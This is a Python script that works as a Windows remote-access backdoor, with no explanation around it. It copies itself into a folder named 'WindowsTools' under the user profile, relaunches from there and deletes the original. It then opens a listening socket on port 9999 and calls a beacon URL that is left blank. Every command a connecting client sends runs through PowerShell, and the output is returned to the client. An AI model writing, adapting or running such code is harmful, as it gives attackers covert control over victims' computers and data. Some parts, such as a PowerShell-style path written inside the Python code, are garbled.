import subprocess
import socket
import os
import requests
import sys
from shutil import copyfile

URL = ""
PORT = 9999

try:
    tmp = sys.argv[1]
    os.remove(tmp)
except:
    d = "$env:userprofile\WindowsTools"
    t = [x for x in __file__.split("\\")]
    t = t[len(t)-1]
    os.mkdir(d)
    copyfile(__file__, d+"\\"+t)
    subprocess.run(f"python3 {d}\\{t} {__file__}")
    sys.exit()

def get_ip():
    #if sys.platform == "win32":
    return socket.gethostbyname(socket.gethostname())
    '''else:
        from re import findall
        ifconfig = subprocess.getoutput("ifconfig")
        lst = findall("(?!255)(?!5)[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.(?!255)[0-9]{1,3}", ifconfig)
        tmp = [x for x in lst if x != "127.0.0.1"]
        return tmp[0], False'''

def main():
    try:
        ip= get_ip()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, PORT))
        s.listen()
        requests.get(URL)
        client, _ = s.accept()
        client.send("[*] Connection Established\n".encode())
        
        done = False
        while not done:
            try:
                client.send(str.encode(os.getcwd() + ">"))
                data = client.recv(1024).decode("UTF-8").strip()
                if data == "exit":
                    client.send("Goodbye...".encode())
                    client.close()
                    s.close()
                    done = True
                elif data[:2] == "cd":
                    os.chdir(data[3:])
                elif len(data) > 0:
                    proc = subprocess.Popen(f"powershell.exe {data}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    #proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    output_str = str(stdout_value, "UTF-8")
                    client.send(str.encode("\n" + output_str))
            except Exception as _:
                    continue
    except KeyboardInterrupt:
        sys.exit()

if __name__ == "__main__":
    main()